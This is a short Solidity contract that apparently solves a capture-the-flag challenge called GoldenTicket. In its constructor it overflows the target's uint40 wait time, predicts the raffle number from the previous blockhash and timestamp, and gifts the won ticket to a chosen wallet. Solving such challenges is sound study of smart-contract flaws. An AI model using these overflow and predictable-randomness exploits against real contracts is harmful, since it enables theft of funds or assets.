// SPDX-License-Identifier: AGPL-3.0-or-later
pragma solidity 0.8.17;

import { GoldenTicket } from "eko/ChallengeGoldenTicket.sol";

contract GoldenTicketCracker {
  constructor(GoldenTicket goldenTicket, address wallet) {
    goldenTicket.joinWaitlist();
    goldenTicket.updateWaitTime(uint256(type(uint40).max) - goldenTicket.waitlist(address(this)) + 2);
    goldenTicket.joinRaffle(uint256(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp))));
    goldenTicket.giftTicket(wallet);
  }
}
